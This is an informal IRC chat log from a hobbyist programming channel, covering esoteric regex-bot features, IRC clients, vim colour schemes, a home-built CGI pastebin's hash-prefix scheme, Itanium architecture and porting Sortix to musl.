Jul 11 02:08:33 <shikhin>	nortti: Regardless, that just ignores c. Alternatively, if there's more possibilities on the matching side, it cycles through the replacement possibilities.
Jul 11 02:08:50 <nortti>	hm
Jul 11 02:08:59 <puckipedia>	I crashed it with xv/\0x0a/a/ btw
Jul 11 02:09:28 <shikhin>	happybot: happy yourself
Jul 11 02:09:29 *	happybot ​gives happybot a massage with a happy ending
Jul 11 02:09:30 <nortti>	any particular reason for that kind of way for dealing with mismatched sizes on each side?
Jul 11 02:09:33 <shikhin>	Ah, good, you didn't crash the bot.
Jul 11 02:10:07 <shikhin>	nortti: For the former, that seems like the only option? For the latter, I think there was some motivating example but I can't remember…
Jul 11 02:10:10 <puckipedia>	it might be run as a separate thing that is being talked to
Jul 11 02:10:27 <shikhin>	happybot's just a bunch of shell scripts hacked together, as far as I know.
Jul 11 02:11:35 <nortti>	shikhin: I was more thinking, have it complain if one side has more, and allow the user to build the cycling themselves
Jul 11 02:11:44 <shikhin>	Mmhm.
Jul 11 02:12:20 <shikhin>	Not sure how to easily build the cycling if you've got a lot of possibilities. (Maybe that never turns out to be the case? I don't know.)
Jul 11 02:12:34 <shikhin>	The indexing thingy would help, but that only supports indices from 0 to 9 right now.
Jul 11 02:12:40 <nortti>	mh
Jul 11 02:14:16 <nortti>	if you added {} or sth for repetition, I guess you could have a special "cycle" character. so you could do [ab]@{5} and it's be same a, b, a, b, a, b, a
Jul 11 02:14:21 <nortti>	-same
Jul 11 02:14:38 <shikhin>	Sounds like a good idea.
Jul 11 02:15:12 <shikhin>	(I think zgrep definitely is going to add {} after he figures out the parser thingy.)

Jul 11 03:06:03 <zgrep>	I ought to switch to a better IRC client.
Jul 11 03:06:25 <zgrep>	Maybe irssi or weechat. Or maybe I should make my own.
Jul 11 03:10:47 <john_cephalopoda>	zgrep: Which one are you using right now?
Jul 11 03:10:55 <zgrep>	Quassel.
Jul 11 03:11:08 <john_cephalopoda>	CLI IRC client?
Jul 11 03:11:12 <zgrep>	No.
Jul 11 03:11:34 <zgrep>	Mainly, I want a scriptable client.
Jul 11 03:11:50 <zgrep>	And a useable android client.
Jul 11 03:11:52 <john_cephalopoda>	Ah. I'm using hexchat, which is scriptable.
Jul 11 03:12:11 <john_cephalopoda>	Using yaaic on android, it's ok.
Jul 11 03:12:11 <zgrep>	Quassel gives me the latter. ZNC + anything sort-of gives me the latter oto.
Jul 11 03:12:13 <zgrep>	s/oto/too/
Jul 11 03:12:13 <bslsk05>	​<zgrep*> Quassel gives me the latter. ZNC + anything sort-of gives me the latter too.
Jul 11 03:12:25 <zgrep>	I believe I've used yaaic... I need a hidden list of channels on the left.
Jul 11 03:12:36 <zgrep>	I'm in a bunch of channels. I should probably part some of them.
Jul 11 03:13:49 <john_cephalopoda>	I am in 12 channels spread over 3 networks.
Jul 11 03:26:19 <nortti>	zgrep: ah, I see. I guess -a also being the plural marker in a couple words mislead me
Jul 11 03:31:12 <zgrep>	john_cephalopoda: I also want a bouncer of some sort, preferably a nice one.
Jul 11 03:31:28 <zgrep>	The main thing I don't like about ZNC is that it requires me to set up a network per, err, network on all of my clients.
Jul 11 03:31:45 <zgrep>	But seeing as how I essentially only use one network... *shrug*.
Jul 11 03:32:43 *	zgrep also sort-of likes the idea of IRC without logs. zgrep still wants to have backlogs, though.
Jul 11 03:33:14 <zgrep>	The only time I find I use my logs is for happybot, in which case I use happybot's logs. Or when nortti wants to stitch netsplits.
Jul 11 03:35:39 <olsner>	I guess things like direct messages and overlapping channel names would be a problem if you "merged" networks, but it would be a lot nicer in the normal case
Jul 11 03:36:25 <olsner>	er, not direct messages per se, but overlapping users (then again, *usually* the overlapping users are the same person?)
Jul 11 03:39:02 <nortti>	I'm actually not nortti on ircnet, that's someone else
Jul 11 03:39:04 <zgrep>	olsner: You could always opt for the prefix everything approach.

Jul 11 03:43:49 <zgrep>	:D:
Jul 11 03:44:10 <zgrep>	nortti: You could say U menya netu koshok. That's plural. U menya netu koshki, you could say that too.
Jul 11 03:44:32 <nortti>	ah
Jul 11 03:44:53 <nortti>	would that be more "I don't have cats"?
Jul 11 03:45:58 <nortti>	hm, I guess the normal form with "I don't have" I genitive?
Jul 11 03:53:12 <zgrep>	I don't have cats. I don't have (a) cat.
Jul 11 03:53:28 <zgrep>	U menya netu odnoj koshki. I don't have one cat.

Jul 11 04:20:44 <john_cephalopoda>	nortti: The most important things in a font are to me, that it is easy to discern between letters like "1lI" and "O0" and that the letters don't diverge from the standard too much.

Jul 11 04:21:07 <FireFly>	puckipedia: still same suggestion?

Jul 11 04:21:19 <nortti>	john_cephalopoda: what's "standard" and why are those the most important things (regardless of the use case?)
Jul 11 04:22:08 <john_cephalopoda>	nortti: You are right, use case is an important factor.
Jul 11 04:22:48 <john_cephalopoda>	I thought mainly about text documents and computer fonts, but of course styled text can differ from that to look more futuristic.
Jul 11 04:22:53 <john_cephalopoda>	Or old.
Jul 11 04:22:55 <john_cephalopoda>	Or different.
Jul 11 04:24:03 <john_cephalopoda>	One of the fonts presented there was quite nice. It was a futuristic-looking font where the letters were connected by horizontal segments on half their height.

Jul 11 04:25:03 <nortti>	that was one of the few differet styles you could typeset the second font

Jul 12 02:26:47 <nortti>	mh
Jul 12 02:26:59 <nortti>	anyways, if you have .* as "one thing", I think I know how to implement bitwise cyclic tag in repeated xed
Jul 12 02:27:08 <shikhin>	:D
Jul 12 02:27:08 <puckipedia>	ok now I ignore bslsk05 for everything

Jul 12 02:28:16 *	zgrep checks.
Jul 12 02:28:20 <shikhin>	Clearly nortti needs to implement bitwise cyclic tag and then someone needs to add this to the esolang wiki.
Jul 12 02:28:26 <puckipedia>	anyways does anyone know how to remove a /ignore in hexchat

Jul 12 02:29:16 <shikhin>	Ah, yay.
Jul 12 02:29:35 <zgrep>	I'm probably not doing .* any time too soon. But who knows, because I don't.
Jul 12 02:29:42 <shikhin>	Haha.
Jul 12 02:29:43 <nortti>	:D:
Jul 12 02:29:56 <nortti>	I guess I could build a turing machine on top of it
Jul 12 02:30:26 <zgrep>	Yeah, it seems to go with last match, if you have duplicate matches in your xed.
Jul 12 02:30:44 <zgrep>	So x/a|a|a/ will only ever match that third a.

Jul 12 02:36:42 <shikhin>	Mmhm; although bolting on .* and then doing something interesting sounds fun, surely?
Jul 12 02:36:52 <zgrep>	I have a vague idea of how to make it more efficient, maybe. But *shrug*.
Jul 12 02:36:52 <nortti>	would also be interesting to make a more formal model of it, and see what kind of "base" feature set is the minimum possible

Jul 12 13:08:43 <zgrep>	Although... Hmmm...
Jul 12 13:09:10 <nortti>	anyways, you can implement universal turing machine in smallfuck (unbounded), run through sf2xed.py, and then correctly format your input and run it there
Jul 12 13:09:16 <puckipedia>	I think nortti or sometone from #esoteric implemented BCT in sed
Jul 12 13:09:17 <zgrep>	Without wrapping integers, I think it can be done in one s/// command.

Jul 12 13:14:36 <puckipedia>	but then you have a bounded amount of loops
Jul 12 13:15:48 <FireFly>	Hmm.
Jul 12 13:16:47 <FireFly>	I suppose any finite program has to have a bounded number of e.g. loops, loop nesting, etc.. and in a TC language you can necessarily implement any other TC language...
Jul 12 13:17:40 <FireFly>	Well, you could implement a UTM (or brainfuck or whatever) and then just need to support whatever amount of loops that impl requires
Jul 12 13:17:47 <FireFly>	which would be bounded
Jul 12 13:17:48 <nortti>	iirc brainfuck is turing complete with skip-next-command and implicit [] around the program
Jul 12 13:18:03 <nortti>	but that would *not* be fun to program
Jul 12 13:18:06 <FireFly>	haha

Jul 12 13:45:55 <FireFly>	It's.. well
Jul 12 13:46:12 <pecan>	I thought the Snow Crash plot ended up a bit wacky but I loved the world and the characters.
Jul 12 13:46:37 <FireFly>	it's not the /same/, but I kind of like it more honestly. but it's also a bit less action-heavy
Jul 12 13:47:10 <FireFly>	anyway hehe, I should read more Stephenson
Jul 12 13:47:12 <pecan>	The Snow Crash action scenes were among the weaker parts for me so that's fine
Jul 12 13:47:17 <pecan>	Thanks, I'll read Diamond Age

Jul 12 14:02:10 <nortti>	mh
Jul 12 14:02:55 <FireFly>	nanovad: hm? I guess use a colourscheme using only colours 1-16 and not any of the other 256-color or 24-bit colour ones?
Jul 12 14:03:18 <FireFly>	modern vim I think supports 24-bit guifg/guibg even in terminal, which is fancy
Jul 12 14:03:41 <nanovad>	base16 looks promising

Jul 12 14:07:34 <shikhin>	Did you add [= prescribed medicine] or did the poster?
Jul 12 14:08:04 <nortti>	I did
Jul 12 14:08:58 <nanovad>	FireFly: yeah, that's what I'm looking for. I just want to use the 16 colors that I already have defined in my terminal.
Jul 12 14:09:31 <FireFly>	Yeah, then just use a colourscheme only using those, i.e. one that doesn't support 256 colours
Jul 12 14:09:47 <FireFly>	I think the default ones bundled with vim shoudl be limited to the basic 16 colours, probably
Jul 12 14:10:31 <FireFly>	Like e.g.  :colorscheme default
Jul 12 14:11:10 <nanovad>	hmm
Jul 12 14:11:14 <FireFly>	Check  :hi  to see what highlighiting you have applied
Jul 12 14:11:24 <nanovad>	I tried default, and it has a brown that I don't think I defined anywhere
Jul 12 14:11:32 <nanovad>	mind that I am using neovim not just vim
Jul 12 14:11:45 <FireFly>	oh, I dunno if they use a different colourscheme as its default
Jul 12 14:11:47 <nanovad>	Though for schemes it should be mostly the same
Jul 12 14:11:50 <nanovad>	could be
Jul 12 14:11:50 <FireFly>	guess you'd have to check
Jul 12 14:11:56 <FireFly>	check :hi and see what colours it defines?
Jul 12 14:12:01 <FireFly>	and/or just write your own colourscheme
Jul 12 14:12:27 <FireFly>	it's not terribly hard to, especially if you just want to use only the 16 standard ones
Jul 12 14:13:01 <FireFly>	this reminds me that I need to fix/extract my kind of frankencolourscheme someday so I can maintain it separately the way I like it
Jul 12 14:13:11 <FireFly>	and also easily re-use the colours in other contexts
Jul 12 14:13:35 <nortti>	hm, should look at that. sometimes have to disable syntax hilighting since the default coloration for comments is impossible to make out from the bg when running redshift
Jul 12 14:18:54 <nanovad>	FireFly: looks like neovim's default uses 256 colors too
Jul 12 14:20:50 <nanovad>	vim-noctu is the idea of what I want. I think I'll tweak it a bit but it looks like a good start
Jul 12 14:23:21 <FireFly>	ah, neat

Jul 13 08:53:12 <heat>	*flashbacks to vietnam*
Jul 13 08:54:12 <nortti>	for some reason I have a feeling you do not actually have ptsd and are instead using "triggered" in a way that originated as a way to mock people of having mental ilnesses
Jul 13 08:54:33 <heat>	no
Jul 13 08:54:39 <heat>	triggered means really upset
Jul 13 08:54:51 <heat>	I don't know where you got the mocking part
Jul 13 08:58:13 <nortti>	it originates as a term in psychiatry referring to, well, a mental health condition having a trigger that activates an episode. it was used by ppl who have such conditions to refer to exactly that, e.g. in the term "trigger warning". some people found that to be absolutely mock-worthy, and so started referring to any kind of upsetness as "being triggered", with the connotation that being triggered is a 
Jul 13 08:58:19 <nortti>	bad thing
Jul 13 08:58:39 <heat>	err
Jul 13 08:58:48 <heat>	being triggered is objectively a bad thing
Jul 13 08:59:01 <nortti>	er, right, bad phrasing
Jul 13 08:59:26 <nortti>	with the connotation that being triggered makes you a worse person
Jul 13 09:00:12 <heat>	well
Jul 13 09:00:17 <heat>	I don't use it that way
Jul 13 09:00:20 <nortti>	kinda ties with the "if you care about things you are a loser" too, in addition to the mockery of mental health issues
Jul 13 09:00:34 <heat>	neither did I know it came from mental illnesses
Jul 13 09:00:48 <nortti>	hm, interesting
Jul 13 09:00:56 <heat>	the word lost its original meaning
Jul 13 09:01:09 <heat>	I just use triggered as "really upset"
Jul 13 09:01:19 <nortti>	more like there was an active campaign to make lose its original meaning
Jul 13 09:01:29 <nortti>	+it
Jul 13 09:01:50 <heat>	was there?
Jul 13 09:02:36 <nortti>	yeah, by connecting it with "being upset" as a way of mocking triggers and trigger warnings
Jul 13 09:02:59 <nortti>	anyways, it is still used in the psychiatric meaning by ppl who do have those issues as well as the field of psychiatry
Jul 13 09:03:33 <heat>	oh ok
Jul 13 09:03:34 <heat>	TIL
Jul 13 09:03:58 <nortti>	how'd you learn of the term?
Jul 13 09:04:07 <heat>	internet
Jul 13 09:04:27 <nortti>	right, but what context?
Jul 13 09:04:44 <heat>	memes
Jul 13 09:04:47 <heat>	people getting really upset
Jul 13 09:05:19 <nortti>	on sites like reddit?
Jul 13 09:05:39 <heat>	yeah sure
Jul 13 09:05:50 <nortti>	mh
Jul 13 09:05:51 <heat>	and youtube
Jul 13 09:13:25 <john_cephalopoda>	I've also seen "triggering sbd." as an other word of "provoking a strong reaction in somebody".
Jul 13 09:14:34 <john_cephalopoda>	Especially in relation to feminists, SJWs and similar.

Jul 13 09:20:28 <hydraz>	"We shall thus need to say how to compute path Y X (sym XY) y , which amounts to delivering the path in the other direction (the htap?),"
Jul 13 09:22:04 <heat>	john_cephalopoda: yeah, that's a popular use of the word by the alt-right
Jul 13 09:22:04 <john_cephalopoda>	If the Titanic wouldn't have attempted to evade the iceberg, it would have survived.
Jul 13 09:22:21 <heat>	but I know a lot of people who don't use it in that context

Jul 13 10:37:43 <pecan>	«10:15am. My brilliant idea just is not working. This is confusing. The way it outright just diverges is really strongly indicating to me that something foul is going on.»
Jul 13 10:38:02 <pecan>	…then the 11:40am commit message is like a full page :D:
Jul 13 10:38:41 <hydraz>	that is how I feel writing code
Jul 13 10:38:55 <nanovad>	"Basically, nothing is working and my mind is in complete disarray." that's par for the course when coding, yep
Jul 13 10:38:59 <pecan>	It's a very relatable commit log.
Jul 13 10:40:51 <nanovad>	It reads like someone was having a code jam or something and hasn't slept in 3 days tbh
Jul 13 10:41:05 *	CompanionCube bought a manga volume for the first time today. Hopefully it'll be fun to read as someone who hasn't read any manga before
Jul 13 10:42:02 <pecan>	It mentions waking up early several times, so maybe the author is just in a perpetual state of sounding like having not slept in 3 days.
Jul 13 10:42:15 <shikhin>	CompanionCube: Which manga?
Jul 13 10:42:16 <nanovad>	"It was made for the sake of making a deep learning library which was too difficult to do in F# itself for its author." is this Alta Lang?

Jul 13 10:44:43 <hydraz>	what is manga indeed
Jul 13 10:45:04 <hydraz>	CompanionCube: どの漫画？
Jul 13 10:45:59 <CompanionCube>	i already answered, no?
Jul 13 10:46:39 <hydraz>	you did
Jul 13 10:46:44 <shikhin>	Not in Japanese you didn't.
Jul 13 10:47:30 <pecan>	hydraz's "which manga desu" made me think "which is manga" which made me think "_what_ is manga" and then we started getting increasingly japanese, so now you have to answer multiple questions.
Jul 13 10:47:49 <hydraz>	CompanionCube: the answer you're looking for goes 「黒執事」だよ。

Jul 13 11:31:29 <CompanionCube>	pecan: that requires Effort.
Jul 13 11:32:02 <nanovad>	hm, would you use CGI to run a script which presents the pastebin?
Jul 13 11:32:10 <pecan>	Probably.
Jul 13 11:32:49 <pecan>	CGI it to a perl script or something and call it a day. I don't think a pastebin is especially complicated.
Jul 13 11:33:48 <nanovad>	oof.
Jul 13 11:33:53 <nanovad>	I've never written any perl.

Jul 13 11:44:43 <nanovad>	nortti: I think there's a convention to have a newline at the end of files in git, isn't there?
Jul 13 11:45:58 <nanovad>	… hm, but it shows two empty lines on gogs
Jul 13 11:46:00 <nanovad>	odd
Jul 13 11:46:07 <nortti>	right, but that's the unix line terminator, so the end of line looks like 'foo\n'. you have an empty line, 'foo\n\n'
Jul 13 11:46:10 <shikhin>	I think you left one too many newlines.
Jul 13 11:46:35 <nanovad>	merde.

Jul 13 12:31:00 <sortie>	In unrelated news, I figured out how to generate random memes with imagemagick as a backend, and wrote code that generates a meme for each event I already sent emails out about. I just need to turn it on and people get memes by mail order.

Jul 13 12:38:22 <nanovad>	oh? why not?
Jul 13 12:38:52 <nortti>	because on larger screens that can result in ridiculously long lines, making it hard to read

Jul 13 12:39:53 <nortti>	also, the reason newline doesn't work is because you aren't translating it into <br> or whatever

Jul 13 13:30:39 <zgrep>	john_cephalopoda: How so? (I've just gotten used to it...)
Jul 13 13:30:53 <nortti>	you, crying: you can't just call everything a database
Jul 13 13:31:09 <nortti>	zgrep, pointing at a seagull: database
Jul 13 13:31:22 <john_cephalopoda>	zgrep: First of all, it doesn't remember my language settings for the series I am watching. I wanted to watch Steven Universe in English but it kept switching to German in every new episode.
Jul 13 13:31:47 <zgrep>	nortti: It's a flying database!
Jul 13 13:31:53 <zgrep>	With temporary storage in the stomach!
Jul 13 13:32:01 <nanovad>	nortti: haha
Jul 13 13:32:08 <nanovad>	hmm
Jul 13 13:32:24 <nortti>	zgrep: python's flying database
Jul 13 13:32:35 <zgrep>	john_cephalopoda: Mmh. Interesting. It does that for me with subtitles, but it seems to remember what language I want to watch in.
Jul 13 13:32:40 <nanovad>	I mean, I wasn't thinking full on SQLite database, but you could make a file format that's just <timestamp of deletion>\n<title?>\n<content>
Jul 13 13:33:01 <zgrep>	sqheavy
Jul 13 13:33:03 <nanovad>	and then have all requests for files get handled transparently by the CGI script…
Jul 13 13:33:07 <nortti>	also, nanovad, how do you deal with hash collisions?
Jul 13 13:33:10 <shikhin>	It's only recently done that for me with subtitles, so I'm inclined to say recent bug (and not call the entire website shitty).
Jul 13 13:33:11 <nanovad>	nortti: "overwrite"
Jul 13 13:33:13 <nanovad>	:P
Jul 13 13:33:22 <john_cephalopoda>	zgrep: Furthermore in series that go <pre-intro cliffhanger> <intro> <series>, it starts at 0:00 and lets you skip the intro when the intro has started, while series that go <intro> <series> skip the intro without giving me the chance to watch it.
Jul 13 13:33:28 <zgrep>	nortti: It generates new files with the same amount of energy. That way we can discover new files.
Jul 13 13:33:43 <nortti>	:D:
Jul 13 13:34:01 <john_cephalopoda>	I have to rewind to 0:00 in the show I am watching right now every time because the intro is only 30 seconds long, is pretty fun and cuts into the series in a pretty nice way.
Jul 13 13:34:04 <zgrep>	john_cephalopoda: Personally I find that a nice feature, because I don't want to see the intro again and again.
Jul 13 13:34:27 <john_cephalopoda>	zgrep: A "skip intro" button would work just as well, or an option "skip intro every time".
Jul 13 13:34:28 <zgrep>	It does show you the intro if you start playing after not having played.
Jul 13 13:34:34 <zgrep>	john_cephalopoda: No. That'd be annoying.
Jul 13 13:34:42 <zgrep>	The latter, sure.
Jul 13 13:34:44 <shikhin>	You can disable that.
Jul 13 13:34:51 <zgrep>	:D:
Jul 13 13:35:15 <john_cephalopoda>	Also language settings in general don't seem to exist.
Jul 13 13:35:39 <shikhin>	That's also not true.
Jul 13 13:35:40 <nanovad>	nortti: . o O ( adding an extra character at the end of the hash if there's a collision )
Jul 13 13:35:55 <john_cephalopoda>	Something like "prefer <language>" or "prefer <original language> with subtitles in <language>"
Jul 13 13:35:56 <shikhin>	https://help.netflix.com/en/node/13245  Just takes a google search...
Jul 13 13:35:58 <bslsk05>	​help.netflix.com: Netflix is in the wrong language.
Jul 13 13:36:10 <shikhin>	"profile language" is your preferred language.
Jul 13 13:36:33 <nortti>	nanovad: I mean, sure. makes sense, since it's not meant to be content-addressable aiui?
Jul 13 13:37:48 <nanovad>	right
Jul 13 13:37:54 <nanovad>	It's just a way of generating a unique path
Jul 13 13:38:22 <john_cephalopoda>	shikhin: The language in those settings is set to "Español".
Jul 13 13:38:44 <john_cephalopoda>	"Selecciona el idioma de tu preferencia para Netflix. No todos los programas y las películas están disponibles en todos los idiomas."
Jul 13 13:38:45 <shikhin>	I'd be very tempted to blame the user.
Jul 13 13:38:52 <john_cephalopoda>	Steven Universe is available in Spanish.
Jul 13 13:38:59 <john_cephalopoda>	But it _still_ plays it in German.
Jul 13 13:40:01 <john_cephalopoda>	If it would play it in Spanish, it would make sense and I won't complain.
Jul 13 13:40:40 <nanovad>	… I think I just nuked ahti's index.html
Jul 13 13:40:43 <john_cephalopoda>	But it plays it in fucking German. It doesn't remember that I switch to English in every episode.
Jul 13 13:40:45 *	nanovad saves the copy in his cache
Jul 13 13:40:50 <nortti>	nanovad: also, there's, uh, some option I forget that makes open() fail if there already exists another file of the same name. using that would help to avoid race conditions I think
Jul 13 13:41:04 <nortti>	< nanovad> … I think I just nuked ahti's index.html ← how?
Jul 13 13:41:29 <nortti>	ah, open(foo, 'x')
Jul 13 13:41:30 <nanovad>	meant to move my paste file into a subfolder of /var/www but accidentally overwrote /var/www/index.html
Jul 13 13:41:37 <john_cephalopoda>	I bet it saves any dumb data that it can collect and sends it to google to improve its ads or whatever. Instead of improving user experience.
Jul 13 13:41:38 <nortti>	:D:
Jul 13 13:41:46 <CompanionCube>	isn't it autogenerated anyway
Jul 13 13:41:47 <nanovad>	it's okay, I'll replace the file once I get scp working
Jul 13 13:42:32 <CompanionCube>	also
Jul 13 13:42:33 <john_cephalopoda>	But there is no good netflix alternative so they don't care.
Jul 13 13:42:40 <CompanionCube>	index.html lives

Jul 13 13:44:01 <nanovad>	… I wonder if that was a placeholder.
Jul 13 13:44:17 <nortti>	I regenned it from the git

Jul 13 13:44:38 <nortti>	(see /home/shared/wiki.git/hooks/post-receive or sth)
Jul 13 13:45:49 <nanovad>	okay, I think I added ahti.space/paste as /var/www/paste
Jul 13 13:46:11 *	nanovad reloads configuration
Jul 13 13:46:42 <nortti>	should it work without reloading the config, too?

Jul 13 14:22:14 <shikhin>	That works whatever you decide to encode things with.
Jul 13 14:22:28 <nanovad>	Won't pastes take progressively longer as you have to search more to find if there is an existing paste?
Jul 13 14:22:40 <shikhin>	Hm?
Jul 13 14:22:45 <nortti>	or maybe sth like max(6, shortest non-ambiguous) long prefix
Jul 13 14:22:56 <hydraz>	yeah
Jul 13 14:22:57 <shikhin>	It'll only take the length-of-hash many queries to find out what prefix you give.

Jul 13 14:23:02 <puckipedia>	oh haha
Jul 13 14:23:03 <puckipedia>	that's 8
Jul 13 14:23:43 <nanovad>	hmm
Jul 13 14:23:43 <nortti>	nanovad: it'll scale with at worst log₂, so…
Jul 13 14:23:45 <nanovad>	guess so
Jul 13 14:24:24 <hydraz>	I can't for the life of me figure out where I read about this. It was a paper about encoding inductive families with indices by recursion over the ind(ex|ices), in Agda if memory serves
Jul 13 14:24:25 <nanovad>	okay, so generate hash, use 6 characters, check for collision, increase to 7, rinse and repeat until there's an unambiguous path or a true collision
Jul 13 14:24:53 <nortti>	(and as we know, in algorithm time / space complexity, logarithms are just big constants)
Jul 13 14:24:54 <shikhin>	Mmhm; are you handling collisions?
Jul 13 14:25:16 <shikhin>	nortti: This *is* a tiny constant since you're using a fixed size hash after all.
Jul 13 14:25:35 <nortti>	oh, right
Jul 13 14:25:47 <shikhin>	(Although I guess depends on how you handle collisions.)
Jul 13 14:25:54 <nanovad>	shikhin: overwriting at the moment. don't know
Jul 13 14:25:58 <nortti>	it's not even log, it's loglog
Jul 13 14:26:18 <nanovad>	login
Jul 13 14:26:47 <nortti>	hot take: linear scales are much superior to loglogs on slide rules
Jul 13 14:27:28 <nortti>	they are easier to get intuitively and since you'll only need one, you can fit them on a pocket-sized one
Jul 13 14:29:07 <hydraz>	the problem with a paper about types defined by recursion is that if you google "recursive types" you get, well, recursive types
Jul 13 14:30:17 <shikhin>	Hehe.

Jul 13 14:50:16 <nortti>	nanovad: what's the point of the "if i != unique_len: break"?
Jul 13 14:50:53 <nanovad>	nortti: i only != unique_len if a match was found, i.e. the unique length is determined to be shorter than the previous search length. So the loop doesn't need to continue
Jul 13 14:51:02 <nortti>	ooh, I see
Jul 13 14:51:06 <nanovad>	It's a little opaque
Jul 13 14:51:28 <nortti>	right, the first break breaks out of the inner loop
Jul 13 14:51:35 <nanovad>	yep
Jul 13 14:52:16 <nanovad>	I wonder how the performance is
Jul 13 14:53:44 <nortti>	I'd probably have a list that starts of with all files, you run a loop over it and add to a new list all whose prefixes until i match, move new list over the old, repeat until you're left with 0 matching prefixes

Jul 13 14:56:11 <nanovad>	So you're basically trimming down the list of available hashes as you weed out those that don't fit
Jul 13 14:56:16 <nortti>	yup
Jul 13 14:56:22 <zgrep>	FYI glob is a thing.
Jul 13 14:57:03 <nortti>	doesn't glob read through the directory each time?
Jul 13 14:57:19 <zgrep>	Err, for looking up a long hash only given a short hash.
Jul 13 14:57:44 <nortti>	ah, but what happend when you get another long has with same prefix?
Jul 13 14:57:51 <zgrep>	You get a list of responeses.
Jul 13 14:57:59 <shikhin>	Er.
Jul 13 14:58:00 <nortti>	so now your link is broken
Jul 13 14:58:11 <zgrep>	nortti: And how does any other code prevent that?
Jul 13 14:58:26 <zgrep>	Unless it just saves it with a shorter hash, I guess.
Jul 13 14:58:37 <nortti>	by doing ln -s long_hash short_hash
Jul 13 14:58:43 <zgrep>	Ah.
Jul 13 14:58:55 <shikhin>	For file Y: Go over every file X, set L to max(L, however many bytes of X and Y match + 1)? That seems simpler than what you both suggested.
Jul 13 14:59:08 <nanovad>	hmm, I was going to delete by index from the array as I go, but that's hard
Jul 13 14:59:27 <nortti>	just push into a new one™
Jul 13 14:59:30 <nanovad>	yeah
Jul 13 14:59:32 *	zgrep . o O ( Why use hashes anyway? )
Jul 13 15:00:04 <shikhin>	(If L > length of Y, you have a collision?)
Jul 13 15:00:45 <nortti>	nanovad: or, do sth like paste_hashes = [ph for ph in paste_hashes if full_hash[:i] == ph[:i]]
Jul 13 15:01:08 <shikhin>	Err.
Jul 13 15:01:10 <shikhin>	W-why, though?
Jul 13 15:01:26 <nanovad>	nortti: ah, then when the number of entries is 0, you have a unique hash?
Jul 13 15:01:30 <nortti>	yea
Jul 13 15:01:48 <nortti>	actually, shikhin's seems best
Jul 13 15:02:12 <shikhin>	It avoids comparing bytes you've compared already, too.

Jul 13 15:04:29 <shikhin>	There might be a better solution where you maintain some sort of a tree.
Jul 13 15:04:37 <nortti>	:D:
Jul 13 15:04:41 <shikhin>	But I doubt the performance matters *that* much, so I'm not going to think further.

Jul 13 15:35:14 <shikhin>	hydraz: The first one repeatedly splices the strings despite not needing to! I just do all those comparisons once.
Jul 13 15:35:30 <shikhin>	(And it has to do them at least once.)

Jul 13 15:37:20 <nanovad>	right
Jul 13 15:37:22 <nanovad>	but it doesn't matter

Jul 13 15:38:04 <shikhin>	Err, I could just try this on my end, couldn't I. How to time?
Jul 13 15:38:06 <nanovad>	I think python might have optimized string comparisons, which is why mine is faster

Jul 13 15:54:20 <pecan>	heh
Jul 13 15:54:52 <pecan>	that, or the API (Element#matchesSelector) had just come out and nobody cared about it yet
Jul 13 15:55:32 <hydraz>	I could see both cases being likely. Either the API wasn't optimised enough, or V8(/whatever) optimised your code right because it was running in a loop a lot.

Jul 13 21:13:48 <shikhin>	pecan: Would these issues not be prevalent in Itanium?
Jul 13 21:14:47 <pecan>	No, since they inherently rely on out-of-order execution.
Jul 13 21:15:30 <hydraz>	Didn't intel kill off Itanium because nobody knew how to do proper software scheduling so everything was balls slow?
Jul 13 21:15:42 <shikhin>	I'm not familiar with Itanium at all, can you give me a one/two line summary?
Jul 13 21:15:52 <pecan>	the compilers got pretty decent by the late 2000s
Jul 13 21:16:03 <pecan>	unfortunately by that time AMD had already eaten their lunch 
Jul 13 21:16:05 <hydraz>	huh, do I have the timeframe entirely wrong? sorry, then
Jul 13 21:16:52 <shikhin>	Ah, software scheduling of instructions, neato.
Jul 13 21:16:53 <hydraz>	shikhin: processor based on explicit instruction level parallelism
Jul 13 21:17:21 <shikhin>	How exactly did that work, do you know?
Jul 13 21:17:32 <pecan>	…basically like a glorified DSP, tbh
Jul 13 21:17:45 <shikhin>	Ah.
Jul 13 21:17:48 <hydraz>	I know the compiler was responsible for scheduling instructions decently as opposed to having the hardware guess, but other than that, no, sorry
Jul 13 21:17:57 <pecan>	Instructions get sent in bundles that have no data dependencies between them, so they can all be executed at once
Jul 13 21:18:33 <shikhin>	How would that look like? (Actually, do you know of a good but brief read on this? Or better yet, write one!)
Jul 13 21:19:54 <shikhin>	Has there been more work on compilers for architectures like this since?

Jul 13 21:24:21 <pecan>	It has a lot of cool features. I'm pretty sad they killed it off.
Jul 13 21:25:30 <hydraz>	It's even sadder that they've killed it off now that we know all of the other ones are horribly broken
Jul 13 21:26:50 <pecan>	Yeah. It was the fastest thing we have that's not inherently vulnerable.
Jul 13 21:29:42 <shikhin>	H-how easy would it be to obtain an Itanium machine..
Jul 13 21:31:07 <pecan>	You can find them on ebay periodically. I've been meaning to get one, but I don't exactly have space for something rather large and warm. It would be extremely fun to play around with, even if just for how different it is from other architectures.

Jul 14 13:18:28 <nanovad>	ooh
Jul 14 13:18:37 <nanovad>	That would also make a hash collision extremely improbable
Jul 14 13:18:51 <sortie>	Fun fact:
Jul 14 13:19:01 <sortie>	I ported Sortix to ahti, and in doing so, I also ported it to musl.
Jul 14 13:19:05 <nanovad>	:o

Jul 14 13:20:17 <nanovad>	nanovad@sortixlainen
Jul 14 13:20:38 <sortie>	nanovad: I actually made a libsortix that wrapped musl's headers and added Sortix specific APIs
Jul 14 13:20:56 <nanovad>	neat
Jul 14 13:20:57 <nortti>	was there much of that?
Jul 14 13:21:11 <sortie>	Yeah, that was most of the work
Jul 14 13:21:57 <sortie>	I inject 51 .c files and 31 headers
Jul 14 13:21:59 <nortti>	is the shell you get when you launch sortix the one you've written?
Jul 14 13:22:05 <nortti>	oh wow
Jul 14 13:22:26 <sortie>	nortti: Yes, that's sortix-sh
Jul 14 13:22:42 <nortti>	cool, much nicer to use than I remembber from, uh, 2013 or so
Jul 14 13:22:43 <sortie>	You don't have to use it, you just have to put /sortix/bin and /sortix/sbin in your PATH to use it
Jul 14 13:22:56 <nortti>	oh, apparently it deals *very* poorly with unicode
Jul 14 13:23:05 <sortie>	Yeah that's interesting
Jul 14 13:23:11 <sortie>	Because Sortix handles UTF-8 correctly
Jul 14 13:23:18 <sortie>	Must be a semantic mismatch with musl, perhaps some locale stuff
Jul 14 13:23:53 <sortie>	nortti: Even comes with the Sortix mdoc port and the manual pages
Jul 14 13:23:55 <sortie>	man disked
Jul 14 13:24:14 <nortti>	hah, nice
Jul 14 13:24:20 <sortie>	Even uname -a is fake

Jul 14 13:25:24 <zgrep>	nanovad: ahyesthattextiwantedtosharewithyou.ahti.space
